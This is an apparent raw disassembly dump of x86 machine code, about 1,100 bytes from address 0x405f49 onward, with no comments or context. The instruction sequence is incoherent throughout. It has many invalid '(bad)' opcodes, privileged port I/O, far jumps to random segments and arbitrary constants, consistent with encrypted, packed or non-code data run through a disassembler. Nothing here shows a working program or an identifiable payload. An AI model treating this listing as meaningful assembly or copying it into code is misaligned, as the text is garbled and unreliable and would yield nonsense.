  405f49:	or     BYTE PTR [ebx-0x4e],ch
  405f4c:	enter  0x3af,0xae
  405f50:	fstp   QWORD PTR [esi]
  405f52:	test   BYTE PTR [edi-0x7216f3db],0xf1
  405f59:	shl    BYTE PTR [esi-0x515fb0fc],0xf8
  405f60:	jge    0x405f21
  405f62:	aam    0xa5
  405f64:	daa    
  405f65:	popf   
  405f66:	aas    
  405f67:	fs mov dl,0xea
  405f6a:	in     al,dx
  405f6b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405f6c:	gs dec eax
  405f6e:	fmul   DWORD PTR ds:0xc040ff91
  405f74:	loop   0x405fee
  405f76:	mov    eax,ds:0x37360da6
  405f7b:	aaa    
  405f7c:	sub    dl,BYTE PTR [esi+0x10]
  405f7f:	cmp    al,0x68
  405f81:	pop    ss
  405f82:	sar    DWORD PTR [edx-0x203927e0],cl
  405f88:	xchg   BYTE PTR [edx+ebx*4-0x7e3a29dc],al
  405f8f:	and    dh,BYTE PTR [edx]
  405f91:	mov    ch,0xbe
  405f93:	adc    edx,DWORD PTR [eax]
  405f95:	call   0x35157877
  405f9a:	push   0x4b
  405f9c:	cmp    DWORD PTR [ebx],edx
  405f9e:	push   edx
  405f9f:	mov    bl,0xad
  405fa2:	xchg   esi,eax
  405fa3:	push   edx
  405fa4:	mov    di,fs
  405fa7:	jecxz  0x405fe6
  405fa9:	imul   ebp,DWORD PTR [ecx+0x24],0x1c
  405fad:	xor    al,0x98
  405faf:	mov    bl,0xcc
  405fb1:	data16 js 0x405f4a
  405fb4:	cmp    al,0xf9
  405fb6:	pushf  
  405fb7:	push   eax
  405fb8:	or     al,0x96
  405fba:	sbb    ebx,DWORD PTR [esi-0x24]
  405fbd:	inc    ebx
  405fbe:	mov    ecx,0x374517c
  405fc3:	xchg   esi,eax
  405fc4:	aad    0xc
  405fc6:	pop    ebx
  405fc7:	out    dx,al
  405fc8:	sahf   
  405fc9:	xor    edx,DWORD PTR [eax-0x644fa374]
  405fcf:	dec    esp
  405fd0:	out    dx,eax
  405fd1:	pop    edi
  405fd2:	unpckhps xmm7,xmm4
  405fd5:	loopne 0x405f67
  405fd7:	add    eax,0x2e34404
  405fdc:	xor    BYTE PTR [esp+ebx*2+0x70],dl
  405fe0:	xor    eax,0x45a74ff6
  405fe5:	adc    DWORD PTR [edx+0xdf8d9fd],0xcb9adf52
  405fef:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405ff0:	push   eax
  405ff1:	jnp    0x40606d
  405ff3:	int    0x8a
  405ff5:	adc    edi,DWORD PTR [ecx-0x7a]
  405ff8:	pop    ecx
  405ff9:	call   0xe857:0x27f24eb7
  406000:	nop
  406001:	loope  0x40606f
  406003:	or     eax,0xe9951d15
  406008:	mov    dl,0x32
  40600a:	js     0x405fc1
  40600c:	(bad)
  406010:	fwait
  406011:	cmp    cl,BYTE PTR [esi+0x5302136]
  406017:	dec    edi
  406018:	dec    ecx
  406019:	ja     0x40607c
  40601b:	jmp    0xa196:0xedc5dff3
  406022:	dec    eax
  406023:	dec    edx
  406024:	pop    ecx
  406025:	mov    esp,DWORD PTR [ecx-0x79]
  406028:	in     eax,0xe4
  40602a:	jbe    0x406049
  40602c:	(bad)  
  40602d:	enter  0x23d8,0x7a
  406031:	sub    DWORD PTR [eax],edx
  406033:	xchg   edi,eax
  406034:	sbb    esi,DWORD PTR [edi-0x41]
  406037:	sbb    BYTE PTR [eax-0x7abcf582],ah
  40603d:	jo     0x406048
  40603f:	test   al,0x2d
  406041:	fcom   QWORD PTR [edi+0x5e]
  406044:	pop    es
  406045:	loope  0x40603b
  406047:	idiv   edi
  406049:	ds push eax
  40604b:	mov    al,0x40
  40604d:	repnz scas eax,DWORD PTR es:[edi]
  40604f:	adc    esi,edi
  406051:	push   ecx
  406052:	cmp    eax,0x4371c8d4
  406057:	push   ebp
  406058:	or     esi,DWORD PTR [ebp-0x6ccf0622]
  40605e:	jle    0x406023
  406060:	sbb    DWORD PTR [edi-0x69],edx
  406063:	mov    eax,ds:0xc2635b9c
  406068:	bound  edi,QWORD PTR [edx-0x59]
  40606b:	push   ecx
  40606c:	push   ebp
  40606d:	mov    ah,0x26
  40606f:	fnclex 
  406071:	push   eax
  406072:	and    ebx,eax
  406074:	xlat   BYTE PTR ds:[ebx]
  406075:	xlat   BYTE PTR ds:[ebx]
  406076:	retf   0xf0e4
  406079:	mov    ebp,0x1eba00bb
  40607e:	adc    bl,bl
  406080:	pop    edx
  406081:	mov    edx,0xf08a12b3
  406086:	les    esp,FWORD PTR [edx+0x6a]
  406089:	add    al,0x86
  40608b:	cld    
  40608c:	xor    BYTE PTR [esi],al
  40608e:	mov    cl,0x48
  406090:	xor    ebx,esp
  406092:	rcl    DWORD PTR [ebx],0xe0
  406095:	(bad)  
  406096:	(bad)  
  406098:	xchg   edx,eax
  406099:	jle    0x406112
  40609b:	jb     0x4060e9
  40609d:	jle    0x4060e5
  40609f:	mov    cl,0x6
  4060a1:	call   0x9565d46f
  4060a6:	retf   
  4060a7:	(bad)  
  4060a8:	sub    bl,dl
  4060aa:	(bad)  
  4060ac:	test   DWORD PTR [ecx+0x4f],esp
  4060af:	loop   0x406064
  4060b1:	ror    DWORD PTR ds:0xf13f886c,0x0
  4060b8:	dec    eax
  4060b9:	mov    dl,0x8b
  4060bb:	xlat   BYTE PTR ds:[ebx]
  4060bc:	in     al,dx
  4060bd:	jmp    0x4060ec
  4060bf:	jne    0x4060fb
  4060c1:	in     eax,dx
  4060c2:	ins    BYTE PTR es:[edi],dx
  4060c3:	loope  0x406114
  4060c5:	leave  
  4060c6:	aaa    
  4060c7:	inc    esi
  4060c8:	mov    esp,0x2ea1be38
  4060cd:	jae    0x406070
  4060cf:	add    DWORD PTR [edi],esp
  4060d1:	adc    ebp,DWORD PTR es:[esi]
  4060d4:	lds    esi,FWORD PTR [eax-0x4f36e6ee]
  4060da:	fwait
  4060db:	jge    0x406103
  4060dd:	or     ah,BYTE PTR [eax-0x6f0d698a]
  4060e3:	cmp    al,0x41
  4060e5:	push   es
  4060e6:	and    ch,BYTE PTR [edi+0x27]
  4060e9:	mov    ds:0xfa9e2c88,al
  4060ee:	jge    0x40612e
  4060f0:	retf   0x591e
  4060f3:	xchg   ebp,eax
  4060f4:	loop   0x4060c5
  4060f6:	cmc    
  4060f7:	jge    0x406124
  4060f9:	push   ebp
  4060fa:	xor    edx,DWORD PTR [esi-0x3a]
  4060fd:	jo     0x406137
  4060ff:	cli    
  406100:	fadd   st,st(1)
  406102:	ins    DWORD PTR es:[edi],dx
  406103:	sub    eax,0x312eacd4
  406108:	cdq    
  406109:	and    al,0x2a
  40610b:	dec    esp
  40610c:	nop
  40610d:	das    
  40610e:	or     BYTE PTR [ecx-0x4ac041fe],al
  406114:	dec    esp
  406115:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406116:	or     DWORD PTR [edi+0x7a],ebp
  406119:	mov    eax,0x79fb9179
  40611e:	push   ds
  40611f:	rol    DWORD PTR [esi+0x74],cl
  406122:	cwde   
  406123:	add    al,0x9e
  406125:	jmp    0xc64d:0xfad35518
  40612c:	mov    cl,0x31
  40612e:	loop   0x40616f
  406130:	inc    ebx
  406131:	outs   dx,DWORD PTR ds:[esi]
  406132:	or     DWORD PTR ds:0x9a84c117,esi
  406138:	or     ebx,esi
  40613a:	add    eax,0xfec17a98
  40613f:	push   ss
  406140:	xchg   DWORD PTR [eax+0x3e2b5c37],edx
  406146:	xor    eax,DWORD PTR [ecx]
  406148:	stos   BYTE PTR es:[edi],al
  406149:	(bad)  
  40614a:	push   esi
  40614b:	fnsave [ecx-0x80]
  40614e:	sbb    al,0x92
  406150:	inc    ebp
  406151:	fcmovbe st,st(0)
  406153:	test   ch,ah
  406155:	add    BYTE PTR [ecx+eax*1],0xcc
  406159:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40615a:	popa   
  40615b:	adc    al,0xff
  40615d:	daa    
  40615e:	ins    BYTE PTR es:[edi],dx
  40615f:	cld    
  406160:	mov    esp,0x1f24858c
  406165:	test   eax,0x5df386b1
  40616a:	mov    esp,0x6e738eaa
  40616f:	xchg   BYTE PTR [ebp-0x3eb1f34b],al
  406175:	into   
  406176:	add    ch,BYTE PTR [ecx+0x7988a873]
  40617c:	adc    esp,DWORD PTR [ebx]
  40617e:	pop    ebp
  40617f:	(bad)  
  406180:	out    0x7c,eax
  406182:	in     eax,dx
  406183:	inc    edi
  406184:	sti    
  406185:	mov    esp,0xf63c18a
  40618a:	maskmovq mm7,(bad)
  40618b:	idiv   DWORD PTR [ecx-0xc]
  40618e:	(bad)  
  40618f:	mov    dh,0x6d
  406191:	push   ebx
  406192:	add    BYTE PTR [esp+ebp*8+0x608f3090],bl
  406199:	stos   BYTE PTR es:[edi],al
  40619a:	sub    BYTE PTR [esi-0x173f3f50],0x93
  4061a1:	cs jl  0x40619c
  4061a4:	push   cs
  4061a5:	adc    DWORD PTR [esp+esi*2],esi
  4061a8:	shl    eax,cl
  4061aa:	xchg   ebp,eax
  4061ab:	xchg   esi,eax
  4061ac:	cld    
  4061ad:	xchg   ecx,eax
  4061ae:	mov    eax,0xbbd6d90f
  4061b3:	inc    ebx
  4061b4:	test   esp,ecx
  4061b6:	call   0xa99f495
  4061bb:	mov    gs,WORD PTR [edi-0x574e63cc]
  4061c1:	xor    BYTE PTR [edi+edx*2-0x2f3f22e1],dl
  4061c8:	inc    esi
  4061c9:	mov    BYTE PTR [ebx+0xa77b3c9],dh
  4061cf:	jo     0x40619a
  4061d1:	loopne 0x4061f0
  4061d3:	mov    ah,0xf8
  4061d5:	inc    DWORD PTR [ecx-0x1ce942dd]
  4061db:	jno    0x406241
  4061dd:	pop    ecx
  4061de:	sub    ecx,DWORD PTR ds:0x63f068f8
  4061e4:	fist   WORD PTR [esi]
  4061e6:	and    ch,BYTE PTR ds:0x7fe9704f
  4061ec:	lahf   
  4061ed:	push   ecx
  4061ee:	xchg   ebp,eax
  4061ef:	ret    0x703f
  4061f2:	push   edi
  4061f3:	dec    ecx
  4061f4:	add    esi,DWORD PTR [eax]
  4061f6:	daa    
  4061f7:	push   ebx
  4061f8:	jae    0x406273
  4061fa:	add    DWORD PTR [edx-0x7f99e1f1],edi
  406200:	sbb    al,ch
  406202:	jg     0x4061ae
  406204:	add    eax,0x28094de1
  406209:	fwait
  40620a:	pop    edx
  40620b:	lahf   
  40620c:	loop   0x4061bf
  40620e:	push   ebx
  40620f:	jle    0x40624d
  406211:	xor    al,0x86
  406213:	clc    
  406214:	jae    0x4061dc
  406216:	jmp    0x6faa8cc3
  40621b:	lods   eax,DWORD PTR ds:[esi]
  40621c:	dec    edx
  40621d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40621e:	xchg   dh,ah
  406220:	mov    eax,ds:0x957c8641
  406225:	add    cl,dh
  406227:	xor    dh,dl
  406229:	jl     0x406299
  40622b:	xchg   ecx,eax
  40622c:	les    edi,FWORD PTR [eax]
  40622e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40622f:	dec    edx
  406230:	xchg   edi,eax
  406231:	pop    ecx
  406232:	xor    ah,BYTE PTR [edi]
  406234:	arpl   cx,bx
  406236:	inc    ebx
  406237:	lds    ecx,FWORD PTR [edi+ebp*4-0x1]
  40623b:	daa    
  40623c:	jge    0x4061dd
  40623e:	mov    ds:0x4405d8bd,al
  406243:	xchg   edi,eax
  406244:	cmp    al,BYTE PTR [edi]
  406246:	xor    eax,0xc7eae922
  40624c:	jg     0x406221
  40624e:	sbb    DWORD PTR ds:0x2b32a9ba,ecx
  406254:	jns    0x40625c
  406256:	fmul   st(3),st
  406258:	repz dec eax
  40625a:	cmp    BYTE PTR [ebx],al
  40625c:	push   ebp
  40625d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40625e:	jno    0x40629e
  406260:	cmp    ch,BYTE PTR [edx]
  406262:	pop    ss
  406263:	xor    al,BYTE PTR [edx+0x66f86611]
  406269:	nop
  40626a:	stc    
  40626b:	fst    st(3)
  40626d:	gs inc eax
  40626f:	sbb    DWORD PTR [eax+0x7636c8d5],ebp
  406275:	into   
  406276:	inc    edi
  406277:	fdivr  QWORD PTR [eax]
  406279:	fiadd  DWORD PTR fs:[ebp-0x4fa5a20d]
  406280:	mov    dh,0xa3
  406282:	loop   0x406234
  406284:	cld    
  406285:	aaa    
  406286:	lods   eax,DWORD PTR ds:[esi]
  406287:	fucomp st(2)
  406289:	inc    edx
  40628a:	into   
  40628b:	sbb    al,0xe2
  40628d:	es lahf 
  40628f:	cli    
  406290:	add    esi,esp
  406292:	mov    BYTE PTR [eax+edx*1],dl
  406295:	xchg   ebp,eax
  406296:	cdq    
  406297:	add    eax,0x347daaff
  40629c:	jge    0x406277
  40629e:	xchg   esi,eax
  40629f:	pushf  
  4062a0:	std    
  4062a1:	jl     0x4062f4
  4062a3:	dec    ecx
  4062a4:	push   es
  4062a5:	sub    eax,0x7ddbcbfa
  4062aa:	mov    al,0xed
  4062ac:	push   ecx
  4062ad:	outs   dx,BYTE PTR ds:[esi]
  4062af:	add    al,BYTE PTR [ebx+0x73]
  4062b2:	push   ds
  4062b3:	jle    0x40625b
  4062b5:	stos   DWORD PTR es:[edi],eax
  4062b6:	adc    al,0x8a
  4062b8:	jle    0x406250
  4062ba:	sub    esp,esp
  4062bc:	push   0xffffff8f
  4062be:	stos   DWORD PTR es:[edi],eax
  4062bf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4062c0:	push   esp
  4062c1:	sahf   
  4062c2:	jo     0x406284
  4062c4:	mov    eax,0xe754d3b
  4062c9:	mov    al,0xee
  4062cb:	push   esp
  4062cc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4062cd:	sbb    ebx,DWORD PTR [esi+0x597ced1a]
  4062d3:	xchg   esp,eax
  4062d4:	int3   
  4062d5:	cmp    cl,BYTE PTR [edi]
  4062d7:	(bad)  
  4062d8:	dec    edx
  4062d9:	push   ecx
  4062da:	xlat   BYTE PTR ds:[ebx]
  4062db:	ds in  al,dx
  4062dd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4062de:	jge    0x4062b6
  4062e0:	dec    esi
  4062e1:	jne    0x40634b
  4062e3:	jnp    0x4062c0
  4062e5:	push   ebx
  4062e6:	mul    BYTE PTR [eax+0x10]
  4062e9:	cmp    DWORD PTR [esi+0x65],ebx
  4062ec:	in     al,0xba
  4062ee:	fs pop ebx
  4062f0:	in     al,dx
  4062f1:	lahf   
  4062f2:	lahf   
  4062f3:	fsub   st,st(2)
  4062f5:	shr    bh,1
  4062f7:	call   FWORD PTR [esi-0x47fa671a]
  4062fd:	stos   DWORD PTR es:[edi],eax
  4062fe:	jo     0x406289
  406300:	dec    ebp
  406301:	adc    BYTE PTR [edi+0x282a3785],bl
  406307:	ss (bad) 
  406309:	adc    esp,DWORD PTR [esi]
  40630b:	mov    esi,0x2c2c7563
  406310:	pop    ecx
  406311:	popf   
  406312:	cmp    BYTE PTR ds:0x465e0aa,bh
  406318:	loop   0x4062d4
  40631a:	in     eax,dx
  40631b:	out    0xfd,al
  40631d:	sti    
  40631e:	ror    BYTE PTR [ebx-0x3b625cbf],1
  406324:	mov    WORD PTR [edx],gs
  406326:	mov    edi,0xd5aae6e0
  40632b:	mov    WORD PTR [ecx+0x59],es
  40632e:	(bad)  
  40632f:	fadd   DWORD PTR [ecx-0x33c37295]
  406335:	imul   esi,DWORD PTR [ecx+esi*1],0xffffffc7
  406339:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40633a:	daa    
  40633b:	adc    ecx,esi
  40633d:	sbb    BYTE PTR [ebp+ecx*8-0x1d],al
  406341:	cmp    dh,BYTE PTR [ebx+ebp*2]
  406344:	or     BYTE PTR [ebp+eax*4-0x16],bl
  406348:	push   0x4a423919
  40634d:	jle    0x4063b0
  40634f:	(bad)  
  406350:	ins    BYTE PTR es:[edi],dx
  406351:	mov    bh,0xe
  406353:	test   al,0xd9
  406355:	cmp    DWORD PTR [edx-0xd],0x4443c99a
  40635c:	adc    DWORD PTR [ecx+0x415d8f52],ebx
  406362:	popa   
  406363:	inc    eax
  406364:	mov    ebx,0xfe9d9e96
  406369:	mov    esi,0xef202052
  40636e:	aam    0x4b
  406370:	adc    ah,BYTE PTR [ebp-0x58b286ab]
  406376:	fadd   st,st(1)
  406378:	mov    dl,0x8b
  40637a:	lds    esp,FWORD PTR [edi+0x6]
  40637d:	ret    0xd4e6
  406380:	scas   eax,DWORD PTR es:[edi]
  406381:	ins    BYTE PTR es:[edi],dx
  406382:	push   esi
  406383:	stos   DWORD PTR es:[edi],eax
  406384:	sbb    dh,BYTE PTR [eax]
  406386:	xor    BYTE PTR [ecx-0x15],0xf3
  40638a:	xchg   DWORD PTR [ecx],edx
  40638c:	pop    eax
  40638d:	push   ss
  40638e:	xchg   esi,eax
  40638f:	arpl   WORD PTR [ecx+0x4929093a],dx
  406395:	neg    bh
  406397:	fist   DWORD PTR [edx+ebp*8+0x51ae17a1]
  40639e:	mov    edi,0xcf071f1b
  4063a3:	mov    ds:0x2d8d19e7,al
  4063a8:	les    ecx,FWORD PTR [edi-0x1ff89a16]
  4063ae:	and    eax,DWORD PTR [ecx]
  4063b0:	hlt    
  4063b1:	push   es
  4063b2:	cwde   
  4063b3:	xchg   esi,eax
  4063b4:	(bad)  
  4063b6:	inc    edi
  4063b7:	mov    ecx,0xee365685
  4063bc:	add    al,0x88
  4063be:	aad    0xc0
  4063c0:	xor    eax,0x324e763b
  4063c5:	call   FWORD PTR [eax]
  4063c7:	sbb    BYTE PTR [ebp+0x1d],al
  4063ca:	adc    BYTE PTR [ecx],ah
  4063cc:	mov    esi,0x9edb9f1
  4063d1:	dec    ebx
  4063d2:	jb     0x4063ce
  4063d4:	dec    esi
  4063d5:	shl    edx,1
  4063d7:	mov    WORD PTR [edi+0x6e],?
  4063da:	leave  
  4063db:	call   0xfdba:0xd5f40766
  4063e2:	and    DWORD PTR [ebp+ebx*8+0x60],edx
  4063e6:	fs pop ecx
  4063e8:	xchg   esp,eax
  4063e9:	inc    BYTE PTR ds:0x76245291
  4063ef:	mov    ebx,0x52902e66
  4063f4:	imul   esp,DWORD PTR [ecx],0x45
  4063f7:	mov    ecx,edx
  4063f9:	ins    DWORD PTR es:[edi],dx
  4063fa:	ror    BYTE PTR [edx-0x2e7e662b],cl
  406400:	xlat   BYTE PTR ds:[ebx]
  406401:	stc    
  406402:	fisub  DWORD PTR [edi+0x7e168088]
  406408:	aaa    
  406409:	mov    bl,BYTE PTR [edi]
  40640b:	aad    0xf7
  40640d:	stos   DWORD PTR es:[edi],eax
  40640e:	aam    0x5e
  406410:	ins    BYTE PTR es:[edi],dx
  406411:	retf   
  406412:	fiadd  WORD PTR [edx]
  406414:	xchg   ebx,eax
  406415:	xor    ah,BYTE PTR [eax]
  406417:	or     dl,BYTE PTR [eax]
  406419:	fmul   QWORD PTR [esi+eiz*1]
  40641c:	sbb    al,0xc
  40641e:	push   eax
  40641f:	push   es
  406420:	jns    0x406481
  406422:	sti    
  406423:	inc    esi
  406424:	adc    BYTE PTR [ecx+0x3f],0x95
  406428:	dec    eax
  406429:	inc    esp
  40642a:	xchg   esi,eax
  40642b:	cmp    BYTE PTR [ecx],bh
  40642d:	aaa    
  40642e:	scas   eax,DWORD PTR es:[edi]
  40642f:	pop    ebp
  406430:	data16 jae 0x4063c7
  406433:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406434:	cs pop ebx
  406436:	fucomi st,st(6)
  406438:	test   al,0x40
  40643a:	xor    bl,0xfc
  40643d:	enter  0xda9a,0x49
  406441:	int3   
  406442:	cli    
  406443:	clc    
  406444:	outs   dx,BYTE PTR ds:[esi]
  406445:	sbb    bl,BYTE PTR [eax+0x4f217243]
  40644b:	fisttp WORD PTR [edx]
  40644d:	mov    ah,0x60
  40644f:	test   BYTE PTR [edx-0x7d187b85],al
  406455:	repnz mov ebp,0xe4b37be5
  40645b:	dec    edx
  40645c:	jge    0x406400
  40645e:	lahf   
  40645f:	push   ecx
  406460:	jmp    0xdd47:0x1e3355eb
  406467:	xor    eax,0x91b9803c
  40646c:	lods   al,BYTE PTR ds:[esi]
  40646d:	outs   dx,DWORD PTR ds:[esi]
  40646e:	in     al,0x90
  406470:	mov    ch,0xa1
  406472:	hlt    
  406473:	dec    ebx
  406474:	mov    dh,0x7d
  406476:	push   0xffffff80
  406478:	cdq    
  406479:	mov    edi,0x48b388b5
  40647e:	xchg   BYTE PTR [edx],al
  406480:	bound  ebx,QWORD PTR [ebx-0x33]
  406483:	popa   
  406484:	jmp    0x7895:0xecec2589
  40648b:	adc    DWORD PTR ds:0x8025ff5a,0x6b6ebe34
  406495:	and    BYTE PTR [ebp-0x5b],bl
  406498:	scas   eax,DWORD PTR es:[edi]
  406499:	sub    ecx,DWORD PTR [esi-0x56]
  40649c:	int3   
  40649d:	imul   esi,DWORD PTR [ecx],0x21
  4064a0:	call   0x7f8a21e8
  4064a5:	test   BYTE PTR [edx+0x66ba7c20],cl
  4064ab:	mov    esi,0x40de05ae
  4064b0:	in     eax,0xe1
  4064b2:	je     0x406496
  4064b4:	jle    0x406445
  4064b6:	mov    esi,0xa980be3e
  4064bb:	test   DWORD PTR [edi-0x162ee5d4],ecx
  4064c1:	pop    ds
  4064c2:	(bad)  
  4064c3:	in     al,0x9e
  4064c5:	push   edi
  4064c6:	enter  0xee23,0x81
  4064ca:	call   0x80ab5572
  4064cf:	mov    al,ds:0xca09f7e0
  4064d4:	cmp    al,0x84
  4064d6:	sbb    eax,0x67f11638
  4064db:	rcl    DWORD PTR [edx],0x8d
  4064de:	fild   DWORD PTR [esp+edx*4]
  4064e1:	mov    esi,gs
  4064e3:	in     al,dx
  4064e4:	rol    BYTE PTR [ecx+0x36],0x81
  4064e8:	clc    
  4064e9:	dec    ebx
  4064ea:	push   ebx
  4064eb:	aas    
  4064ec:	inc    esp
  4064ed:	daa    
  4064ee:	add    eax,0x72634715
  4064f3:	scas   eax,DWORD PTR es:[edi]
  4064f4:	or     edx,DWORD PTR [edi]
  4064f6:	mov    al,ds:0x118cfe0c
  4064fb:	sbb    ebp,DWORD PTR [ecx+0x57]
  4064fe:	out    dx,eax
  4064ff:	pop    ebx
  406500:	lea    ebx,[ecx+0x7d]
  406503:	int    0xdb
  406505:	test   BYTE PTR [ebx-0x63d6414b],0x80
  40650c:	sub    esi,DWORD PTR [edi]
  40650e:	push   eax
  40650f:	lods   al,BYTE PTR ds:[esi]
  406510:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406511:	inc    ebx
  406512:	xchg   esi,eax
  406513:	or     eax,0xd689e8fe
  406518:	clc    
  406519:	pusha  
  40651a:	and    BYTE PTR [edx+ebp*2+0x3d],ah
  40651e:	cmp    DWORD PTR [eax-0x45],ecx
  406521:	lock leave 
  406523:	leave  
  406524:	mov    ds:0x6e689fe2,al
  406529:	sub    dl,BYTE PTR [ebx-0xe75b325]
  40652f:	out    dx,eax
  406530:	sti    
  406531:	test   BYTE PTR [ebx+0x3],cl
  406534:	push   0xffffff8d
  406536:	js     0x4064be
  406538:	test   ebx,ebx
  40653a:	lds    ebx,FWORD PTR [edi]
  40653c:	aas    
  40653d:	call   0x56cf:0x2cd4138f
  406544:	sbb    eax,0x22827bb8
  406549:	pop    ecx
  40654a:	add    BYTE PTR [edx+0x1f],ch
  40654d:	dec    ebx
  40654e:	pushf  
  40654f:	nop
  406550:	rcl    DWORD PTR [esi],cl
  406552:	mov    bl,BYTE PTR [ebx-0x50]
  406555:	xor    al,0xa6
  406557:	add    al,0xf6
  406559:	sahf   
  40655a:	push   esp
  40655b:	call   0x61ee:0x6c389e40
  406562:	xchg   DWORD PTR [edx],edi
  406564:	ins    BYTE PTR es:[edi],dx
  406565:	inc    ebp
  406566:	jmp    0x1d0e:0xc91ae793
  40656d:	mov    ebp,0xc9d1e2ab
  406572:	in     eax,0x3
  406574:	inc    ecx
  406575:	and    bl,BYTE PTR [ecx+0x7c]
  406578:	cs fwait
  40657a:	pop    ebp
  40657b:	fninit 
  40657d:	mov    eax,0x4292e84a
  406582:	sahf   
  406583:	mov    ch,0xff
  406585:	jmp    0x4065b0
  406587:	sub    BYTE PTR [di],bl
  40658a:	loop   0x40656a
  40658c:	jb     0x4065b3
  40658e:	mov    edx,0xb0affd90
  406593:	dec    ebx
  406594:	xchg   ebx,eax
  406595:	pop    ecx
  406596:	rcr    DWORD PTR [si-0x42],0x96
  40659b:	gs cli 
  40659d:	push   ds
  40659e:	sub    eax,esi
  4065a0:	add    al,ah
  4065a2:	or     BYTE PTR [ebx+0x50],al
  4065a5:	mov    eax,DWORD PTR [ecx-0x53f17859]
  4065ab:	clc    
  4065ac:	xor    al,ah
  4065ae:	dec    ebx
  4065af:	test   eax,0xd3032da9
  4065b4:	repz dec ecx
  4065b6:	arpl   WORD PTR [edx],dx
  4065b8:	les    edx,FWORD PTR ds:0x36c14134
  4065be:	enter  0xb818,0x42
  4065c2:	ret    
  4065c3:	ds dec esp
  4065c5:	(bad)  
  4065c7:	js     0x40661f
  4065c9:	mov    ch,0x22
  4065cb:	sub    BYTE PTR [eax+ebp*2-0x1d916322],cl
  4065d2:	adc    al,0x97
  4065d4:	jmp    0xdcc49cdc
  4065d9:	mov    eax,ds:0xa53f3823
  4065de:	sbb    BYTE PTR [ebx+0x34e605e5],dh
  4065e4:	lods   al,BYTE PTR ds:[esi]
  4065e5:	into   
  4065e6:	aas    
  4065e7:	jbe    0x40665b
  4065e9:	sub    al,0x5f
  4065eb:	addr16 aas 
  4065ed:	loop   0x4065c3
  4065ef:	fs sub eax,ecx
  4065f2:	sbb    al,0xcf
  4065f4:	or     al,0xbd
  4065f6:	mul    BYTE PTR ds:0xf99a9439
  4065fc:	add    cl,dh
  4065fe:	ja     0x406661
  406600:	xchg   BYTE PTR [eax],ch
  406602:	(bad)  
  406603:	xchg   edx,eax
  406604:	xchg   BYTE PTR [esi+0x2e],al
  406607:	push   ebx
  406608:	mov    dh,0xc
  40660a:	gs pop ss
  40660c:	xchg   ecx,eax
  40660d:	xlat   BYTE PTR ds:[ebx]
  40660e:	sub    DWORD PTR [esi],eax
  406610:	jle    0x406645
  406612:	es jmp 0x40668f
  406615:	xchg   edx,eax
  406616:	sub    ebp,DWORD PTR [esi-0x5e73e98d]
  40661c:	jl     0x4065ee
  40661e:	fs or  eax,0xf1478fb7
  406624:	push   ebx
  406625:	cmp    DWORD PTR [esi],edi
  406627:	jle    0x4065e9
  406629:	jge    0x406692
  40662b:	in     eax,0x9c
  40662d:	jp     0x406609
  40662f:	std    
  406630:	mov    eax,0x2b2ee47b
  406635:	rol    BYTE PTR [esi+0x0],1
  406638:	xlat   BYTE PTR ds:[ebx]
  406639:	cmp    eax,0x57c171ac
  40663e:	ret    0x5385
  406641:	mov    bl,0xa2
  406643:	sub    ebp,DWORD PTR [edi+0x6f]
  406646:	test   BYTE PTR [esi],0x65
  406649:	inc    edi
  40664a:	dec    esi
  40664b:	push   edx
  40664c:	push   ecx
  40664d:	mov    ss,WORD PTR [edi-0x2d29364c]
  406653:	push   ds
  406654:	inc    edi
  406655:	jns    0x406633
  406657:	js     0x40666e
  406659:	cld    
  40665a:	xchg   esi,eax
  40665b:	mov    cl,0xa8
  40665d:	dec    ebx
  40665e:	scas   al,BYTE PTR es:[edi]
  40665f:	xchg   BYTE PTR ds:0x354c12d8,bl
  406665:	cmp    dh,al
  406667:	sub    bl,BYTE PTR [ecx]
  406669:	call   edi
  40666b:	jle    0x406637
  40666d:	cmp    esi,0x377b939b
  406673:	lahf   
  406674:	jmp    0xabd3:0xfe5848f3
  40667b:	add    DWORD PTR [esi-0x2a812ad5],esp
  406681:	retfw  
  406683:	cmp    ecx,DWORD PTR [esi+0x42]
  406686:	loop   0x406638
  406688:	mov    bl,0xe3
  40668a:	xchg   ecx,eax
  40668b:	fstp   QWORD PTR [eax]
  40668d:	ss nop
  40668f:	push   cs
  406690:	and    DWORD PTR [edx],0xffffffb2
  406693:	rcl    esi,1
  406695:	cmp    DWORD PTR [edi],eax
  406697:	mov    edi,0xb43ee108
  40669c:	sbb    al,0x5e
  40669e:	loopne 0x40663f
  4066a0:	shl    DWORD PTR [edi],cl
  4066a2:	jne    0x406693
  4066a4:	stos   BYTE PTR es:[edi],al
  4066a5:	ror    BYTE PTR [esi+edx*2],1
  4066a8:	mov    ah,0xa
  4066aa:	adc    ebx,ebp
  4066ac:	add    esi,DWORD PTR [esi+0x1becdc76]
  4066b2:	jns    0x406638
  4066b4:	and    BYTE PTR [edi+0x78bbe2cc],dh
  4066ba:	add    BYTE PTR [ecx],bl
  4066bc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4066bd:	in     al,0x9f
  4066bf:	xchg   DWORD PTR [ebx+0x490d01b4],ebp
  4066c5:	xor    DWORD PTR [ebx+0xedc36a7],0x5fbf3409
  4066cf:	or     edx,esi
  4066d1:	pushf  
  4066d2:	jge    0x406732
  4066d4:	in     al,dx
  4066d5:	fwait
  4066d6:	cs xor dl,al
  4066d9:	(bad)  
  4066da:	call   0x2a9892d4
  4066df:	mov    ecx,0x92d5aaa5
  4066e4:	cwde   
  4066e5:	rol    BYTE PTR [edi+0x5798579b],1
  4066eb:	mov    es,WORD PTR [esi+0x60333186]
  4066f1:	das    
  4066f2:	sar    BYTE PTR ds:0xbaf8cefb,cl
  4066f8:	or     DWORD PTR [edi+edi*4+0x33],ecx
  4066fc:	or     BYTE PTR [edi+0x32],dh
  4066ff:	in     eax,0xf2
  406701:	mov    ecx,0x7c81570
